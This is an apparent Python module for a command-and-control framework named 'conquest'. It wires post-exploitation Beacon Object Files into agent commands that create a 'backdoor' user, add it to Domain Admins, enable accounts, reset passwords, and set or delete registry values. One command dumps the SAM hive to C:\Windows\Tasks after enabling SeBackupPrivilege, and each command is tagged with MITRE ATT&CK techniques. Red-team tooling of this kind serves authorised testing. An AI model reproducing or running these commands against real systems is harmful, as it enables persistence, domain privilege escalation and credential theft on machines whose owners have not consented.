import conquest 
import os.path

cmd_addUser = ( 
    conquest.createCommand(name="add-user", description="Add a user to a machine.", example="add-user backdoor Password123!",
                           message="Tasked agent to add a user.", mitre=["T1136.001", "T1136.002"])
            .addArgString("username", "Username of the new account.", True)
            .addArgString("password", "Password of the new account.", True)
            .addFlagString("--server", "server", "Specify target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                username := conquest.get_string(args, 0),
                password := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/adduser/adduser.x64.o",
                params := conquest.bof_pack("ZZZ", [
                    username,           # Z: Username
                    password,           # Z: Password
                    server,             # Z: Target system
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_addGroupmembership = ( 
    conquest.createCommand(name="add-groupmembership", description="Add a specified user to a group.", example="add-groupmembership conquest.local\\backdoor \"Domain Admins\" --server dc01",
                           message="Tasked agent to add a user to a group.", mitre=["T1098.001", "T1078.002"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .addArgString("group", "Name of the target group.", True)
            .addFlagString("--server", "server", "Specify target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                group := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),
                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/addusertogroup/addusertogroup.x64.o",
                params := conquest.bof_pack("ZZZZ", [
                    domain,             # Z: Domain (empty if local account)
                    server,             # Z: Target system
                    username,           # Z: Target user
                    group,              # Z: Target group
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_enableUser = ( 
    conquest.createCommand(name="enable-user", description="Enable a specified user account.", example="enable-user conquest.local\\user",
                           message="Tasked agent to enable a user.", mitre=["T1098"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/enableuser/enableuser.x64.o",
                params := conquest.bof_pack("ZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_unexpireUser = ( 
    conquest.createCommand(name="unexpire-user", description="Unexpire and enable a specified user account.", example="unexpire-user conquest.local\\user",
                           message="Tasked agent to unexpire a user.", mitre=["T1098"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/unexpireuser/unexpireuser.x64.o",
                params := conquest.bof_pack("ZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_setPassword = ( 
    conquest.createCommand(name="set-password", description="Set the password of a target user account.", example="set-password conquest.local\\user Password123!",
                           message="Tasked agent to set user password.", mitre=["T1098"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .addArgString("password", "New password", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                password := conquest.get_string(args, 1),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/setuserpass/setuserpass.x64.o",
                params := conquest.bof_pack("ZZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                    password,           # Z: Password
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
            )))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

REGISTRY_HIVES = {
    "HKCR": 0,  # HKEY_CLASSES_ROOT
    "HKCU": 1,  # HKEY_CURRENT_USER
    "HKLM": 2,  # HKEY_LOCAL_MACHINE
    "HKU": 3    # HKEY_USERS
}

# https://learn.microsoft.com/en-us/dotnet/api/microsoft.win32.registryvaluekind?view=net-10.0
REGISTRY_TYPES = {
    "REG_SZ": 1,
    "REG_EXPAND_SZ": 2,
    "REG_BINARY": 3,
    "REG_DWORD": 4,
    "REG_MULTI_SZ": 7,
    "REG_QWORD": 11
}

# Pack DWORD as 4 bytes little-endian (equivalent to pack("I-", key))
def pack_dword(key):
    val = int(key)
    return bytes([
        val & 0xFF,
        (val >> 8) & 0xFF,
        (val >> 16) & 0xFF,
        (val >> 24) & 0xFF
    ])

def _regSet(agentId, cmdline, args): 
    hive = conquest.get_string(args, 0).upper()
    path = conquest.get_string(args, 1)
    type = conquest.get_string(args, 2).upper()
    data = conquest.get_string(args, 3)
    key = conquest.get_string(args, 4)  
    hostname = conquest.get_string(args, 5)
    
    # Validate hive
    reg_hive = REGISTRY_HIVES.get(hive)
    if reg_hive is None:
        conquest.error(agentId, cmdline, f"Invalid registry hive: {hive}.")
        return
    
    # Validate type
    reg_type = REGISTRY_TYPES.get(type)
    if reg_type is None:
        conquest.error(agentId, cmdline, f"Invalid registry type: {type}.")
        return
    
    # Prepare hostname (add \\ prefix if specified)
    if hostname:
        hostname = f"\\\\{hostname}"
    
    pack_fmt = "zizzi"    
    try:
        if type in ["REG_DWORD", "REG_QWORD"]:
            # Integer types: pack as binary
            pack_fmt += "b"
            reg_data = conquest.pack("i", [data])
        
        elif type == "REG_MULTI_SZ":
            # Multiple strings: encode as UTF-16LE with double null terminator
            pack_fmt += "b"
            reg_data = data.encode('utf-16le') + b'\x00\x00\x00\x00'
        
        elif type in ["REG_SZ", "REG_EXPAND_SZ"]:
            # String types: pack as string
            pack_fmt += "z"
            reg_data = data
        
        elif type == "REG_BINARY":
            # Binary: read from file
            pack_fmt += "b"
            with open(data, 'rb') as f:
                reg_data = f.read()
        
        else:
            conquest.error(agentId, cmdline, f"Unsupported registry type: {type}")
            return 
    except ValueError:
        conquest.error(agentId, cmdline, f"Invalid key for {type}: {data}")
        return
    except FileNotFoundError:
        conquest.error(agentId, cmdline, f"File not found: {data}")
        return
    except Exception as e:
        conquest.error(agentId, cmdline, f"Error processing data: {str(e)}")
        return
    
    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/reg_set/reg_set.x64.o"    
    params = conquest.bof_pack(pack_fmt, [
        hostname,           # z: Hostname (empty or \\hostname)
        reg_hive,           # i: Registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)
        path,               # z: Registry path
        key,                # z: Key name
        reg_type,           # i: Type (1=REG_SZ, 2=REG_EXPAND_SZ, 3=REG_BINARY, 4=REG_DWORD, 7=REG_MULTI_SZ, 11=REG_QWORD)
        reg_data            # z|b: Data 
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")

cmd_regSet = ( 
    conquest.createCommand(name="reg-set", description="Create or set a registry key/value on a target system.", example="reg-set HKCU \"Software\\TestApp\" TestValue REG_SZ \"Hello World\"",
                           message="Tasked agent to set a registry key.", mitre=["T1112"])
            .addArgString("hive", """Registry hive.
Available options:
  - HKCR    HKEY_CLASSES_ROOT
  - HKCU    HKEY_CURRENT_USER
  - HKLM    HKEY_LOCAL_MACHINE
  - HKU     HKEY_USERS""", True)
            .addArgString("path", "Path to the registry key to modify.", True)
            .addArgString("type", """Type of the registry key.
Available options: 
  - REG_SZ              String key
  - REG_EXPAND_SZ       Expandable string
  - REG_BINARY          Binary data (provide file path)
  - REG_DWORD           32-bit integer
  - REG_MULTI_SZ        Multiple strings
  - REG_QWORD           64-bit integer""", True)
            .addArgString("data", "Data to store in the registry key.", True)
            .addFlagString("--key", "key", "Name of the registry key (default: \"\").")
            .addFlagString("--hostname", "hostname", "Target hostname for remote registry (default: local computer).")
            .setHandler(_regSet)
)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _regDelete(agentId, cmdline, args): 
    hive = conquest.get_string(args, 0).upper()
    path = conquest.get_string(args, 1)
    key = conquest.get_string(args, 2)
    delete_key = conquest.get_bool(args, 3)  
    hostname = conquest.get_string(args, 4)
    
    # Validate hive
    reg_hive = REGISTRY_HIVES.get(hive)
    if reg_hive is None:
        conquest.error(agentId, cmdline, f"Invalid registry hive: {hive}.")
        return
    
    # Prepare hostname (add \\ prefix if specified)
    if hostname:
        hostname = f"\\\\{hostname}"
    
    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/reg_delete/reg_delete.x64.o"    
    params = conquest.bof_pack("zizzi", [
        hostname,                   # z: Hostname (empty or \\hostname)
        reg_hive,                   # i: Registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)
        path,                       # z: Registry path
        key,                        # z: Key name 
        int(delete_key),            # i: Delete entire registry key
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")


cmd_regDelete = ( 
    conquest.createCommand(name="reg-delete", description="Delete a registry key/key on a target system.", example="reg-delete HKCU \"Software\\TestApp\" --key myValue",
                           message="Tasked agent to delete a registry key.", mitre=["T1112"])
            .addArgString("hive", """Registry hive.
Available options:
  - HKCR    HKEY_CLASSES_ROOT
  - HKCU    HKEY_CURRENT_USER
  - HKLM    HKEY_LOCAL_MACHINE
  - HKU     HKEY_USERS""", True)
            .addArgString("path", "Path to the registry key to delete.", True)
            .addFlagString("--key", "key", "Name of the registry key to delete (default: \"\").")
            .addFlagBool("--delete-key", "delete-key", "Set this flag to delete the entire registry key.")
            .addFlagString("--hostname", "hostname", "Target hostname for remote registry (default: local computer).")
            .setHandler(_regDelete))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _regSave(agentId, cmdline, args): 
    hive = conquest.get_string(args, 0).upper()
    path = conquest.get_string(args, 1)
    outfile = conquest.get_string(args, 2)
    
    # Validate hive
    reg_hive = REGISTRY_HIVES.get(hive)
    if reg_hive is None:
        conquest.error(agentId, cmdline, f"Invalid registry hive: {hive}.")
        return
    
    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/reg_save/reg_save.x64.o"    
    params = conquest.bof_pack("zzi", [
        path,                       # z: Registry path
        outfile,                    # z: Output file
        reg_hive,                   # i: Registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, "enable-privilege SeBackupPrivilege", f"enable-privilege SeBackupPrivilege")    # SeBackupPrivilege is required, so enable it first
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")


cmd_regSave = ( 
    conquest.createCommand(name="reg-save", description="Save a specified registry key to a file on the target system.\nRequires SeBackupPrivilege!", example="reg-save HKLM SAM C:\\Windows\\Tasks\\sam.txt",
                           message="Tasked agent to save a registry key.", mitre=["T1112"])
            .addArgString("hive", """Registry hive.
Available options:
  - HKCR    HKEY_CLASSES_ROOT
  - HKCU    HKEY_CURRENT_USER
  - HKLM    HKEY_LOCAL_MACHINE
  - HKU     HKEY_USERS""", True)
            .addArgString("path", "Path to the registry key to save.", True)
            .addArgString("output-file", "Output file.", True)
            .setHandler(_regSave))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #



conquest.registerModule(
    name="remote-operations", 
    description="Interact and modify remote Windows systems, services and users.", 
    group="remote-operations", 
    commands=[
        cmd_addUser, cmd_addGroupmembership, cmd_enableUser, cmd_unexpireUser, cmd_setPassword,
        cmd_regSet, cmd_regDelete, cmd_regSave
    ])